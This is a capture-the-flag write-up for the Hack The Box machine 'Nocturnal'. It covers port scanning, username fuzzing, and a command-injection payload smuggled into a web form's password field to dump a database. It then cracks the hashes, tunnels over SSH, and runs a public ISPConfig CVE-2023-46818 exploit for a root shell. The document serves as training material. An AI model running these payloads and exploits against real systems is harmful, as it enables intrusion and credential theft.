---
name: Nocturnal
difficulty: easy
os: linux
platform: htb
date: 9999

img: https://labs.hackthebox.com/storage/avatars/c9efb253e7d1d9b407113e11afdaa905.png
---

## Enumeration

### Port Scan

We start by scanning the target machine for open ports using Nmap. We will use the `-p-` option to scan all ports and the `--open` option to filter out closed ports:
```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.64 -o allPorts
```
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

We try to connect to the web service but redirects us to `http://nocturnal.htb`, so it is necessary to add the domain to our `/etc/hosts` file:
```bash
echo "10.10.11.64 nocturnal.htb" | sudo tee -a /etc/hosts
```

We do nmap scan with service version detection and script scanning using `-sC` and `-sV` options:
```bash
nmap -p 22,80 -sCV nocturnal.htb -o targeted
```
```
ORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 202688700851eede3aa6204187962517 (RSA)
|   256 4f800533a6d42264e9ed14e312bc96f1 (ECDSA)
|_  256 d9881f68438ed42a52fcf066d4b9ee6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Welcome to Nocturnal
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We look for directories and files in the web application using `gobuster`:
```bash
gobuster dir -u http://nocturnal.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nocturnal.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin.php            (Status: 302) [Size: 0] [--> login.php]
/backups              (Status: 301) [Size: 178] [--> http://nocturnal.htb/backups/]
/index.php            (Status: 200) [Size: 1524]
/uploads              (Status: 403) [Size: 162]
```

## User Exploitation

We can see that its posible to list users via URL:
```bash
ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=*.pdf' -w /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -mc 200 -H "Cookie: PHPSESSID=jtv19rd5dq7fs8202f2p9fgfgt" -fr "User not found."
```  
``` 
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=*.pdf
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt
 :: Header           : Cookie: PHPSESSID=jtv19rd5dq7fs8202f2p9fgfgt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Regexp: User not found.
________________________________________________

admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 97ms]
amanda                  [Status: 200, Size: 3319, Words: 1178, Lines: 129, Duration: 107ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 115ms]
``` 

We can access `http://nocturnal.htb/view.php?username=amanda&file=*.pdf` and see if there are any files uploades by the user. `admin` and `tobias` have not uploaded any files.

User `amanda` has uploaded a file called `privacy.odt`. If we unzip it we can find a file called `content.xml` that contains the following credentials:
```xml
amanda:arHkG7HAI68X8s1J
```

We can use these credentials to login to the web application at `http://nocturnal.htb/login.php` and access the admin panel.

We can see its displaying source code of the web app. We can see password field is vulnerable to RCE.
We try several payloads and we find that the following payload works:
```
password=%09bash%09-c%09"<payload>"%09&backup=
```

We execute the following command to get the contents of the db
```bash
password=%09bash%09-c%09"sqlite3%09../nocturnal_database/nocturnal_database.db%09.dump"&backup=
```
```
VALUES(1,'admin','d725aeba143f575736b07e045d8ceebb');
INSERT INTO users VALUES(2,'amanda','df8b20aa0c935023f99ea58358fb63c4');
INSERT INTO users VALUES(4,'tobias','55c82b1ccd55ab219b3b109b07d5061d');
```

We use `https://crackstation.net/` to crack the hashes and we find the following credentials:
```
tobias:slowmotionapocalypse
```

We use these credentials to login via SSH:
```bash
ssh tobias@10.10.11.64
```

We find the user flag in the home directory of the user `tobias`:
```bash
cat /home/tobias/user.txt
```
```
user flag value
```

## Root Exploitation

We use `linpeas.sh` to check for privilege escalation vectors
We see there is a web service running in port 8080 which is not open outside the machine. We do a ssh tunnel to access the web service:
```bash
ssh -L 8080:localhost:8080 tobias@10.10.11.64
```

We can access the web service at `http://localhost:8080` and we are greeted with a ISP Config login page.
We can use the credentials we found earlier to login:
```
admin:slowmotionapocalypse
``` 

We can check which version of ISP Config is running by checking the footer of the page. Its version `3.2.10p1`, vulnerable to CVE-2023-46818.

We clone the exploit repository from `https://github.com/ajdumanhug/CVE-2023-46818.git` and run the exploit:
```bash
git clone https://github.com/ajdumanhug/CVE-2023-46818.git
cd CVE-2023-46818
python3 CVE-2023-46818.py http://localhost:8080 admin slowmotionapocalypse 
```

We get a reverse shell as root and we can find the root flag in the root directory:
```bash
cat /root/root.txt
```
```
root flag value
```

## Conclusion
This writeup details the steps taken to exploit the Nocturnal machine on Hack The Box, from initial enumeration to privilege escalation and obtaining both user and root flags. The process involved web application exploitation, user credential cracking, and leveraging a known vulnerability in ISP Config to gain root access.
This writeup serves as a guide for those looking to understand the exploitation techniques used in this machine and can be used as a reference for similar challenges in the future.
This writeup is intended for educational purposes only and should not be used for malicious activities.
